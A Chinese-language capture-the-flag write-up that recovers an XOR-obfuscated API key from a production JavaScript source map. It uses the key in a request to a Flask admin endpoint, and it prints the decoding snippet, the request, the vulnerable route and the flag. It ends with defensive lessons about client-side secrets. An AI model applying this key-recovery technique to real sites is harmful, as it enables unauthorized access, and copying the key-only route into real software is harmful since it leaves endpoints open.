# mini-me

## 题目简述

登录表单本身不校验凭据，只会跳转到页面；真正的保护位于 `POST /admin/flag`，它要求请求头 `X-API-Key` 等于环境变量 `API_SECRET_KEY`。前端加载的 `main.min.js` 末尾留下了注释，明确提示生产环境忘记移除 `test-main.min.js.map`。该 Source Map 含有未压缩的 `sourcesContent`，其中藏着一段名为 `qyrbkc` 的密钥混淆函数。

这题的核心是客户端资源泄露，而非绕过 Flask 的登录流程：一旦从公开 Source Map 还原 API key，服务器会把该 key 当作充分的管理员凭据。

## 解题过程

### 还原 Source Map

从页面引用的 `/static/js/main.min.js` 取得 `.map` 路径，再读取 `/static/js/test-main.min.js.map`。映射文件的 `sourcesContent` 已包含源代码；无需猜测压缩变量的含义。关键函数把字符串数组逐项转数字，并与从 1 开始的下标异或：

```javascript
const lmsvdt = dhgyvu
  .map((value, index) => String.fromCharCode(Number(value) ^ (index + 1)))
  .reduce((result, ch) => result + ch, '');
```

可在浏览器控制台调用该函数，或将最后的 `console.log` 改为打印 `lmsvdt`。由源码映射恢复的结果为：

```text
TUNG-TUNG-TUNG-TUNG-SAHUR
```

这也与挑战源码的 `.env` 中 `API_SECRET_KEY` 一致，说明它不是前端动画的无关字符串。

### 调用受保护接口

带上恢复到的 key 发出 POST 请求：

```http
POST /admin/flag HTTP/1.1
X-API-Key: TUNG-TUNG-TUNG-TUNG-SAHUR
```

服务端没有再检查 session 或登录状态：

```python
@app.route('/admin/flag', methods=['POST'])
def flag():
    key = request.headers.get('X-API-Key')
    if key == API_SECRET_KEY:
        return FLAG
    return 'Unauthorized', 403
```

### 验证

正确请求直接返回：

```text
DUCTF{Cl13nt-S1d3-H4ck1nG-1s-FuN}
```

## 方法总结

- 核心技巧：利用生产环境公开的 JavaScript Source Map 恢复被压缩/混淆但仍在客户端交付的 secret。
- 识别信号：压缩 JS 中出现 `.map` 注释、静态目录存在 map 文件、或前端有看似无意义的数字数组时，应检查 `sourcesContent`。
- 复用要点：客户端拥有的数据不能作为授权秘密。生产构建应关闭 Source Map 或限制其访问，并让敏感接口使用服务端会话/权限校验而非前端 key。
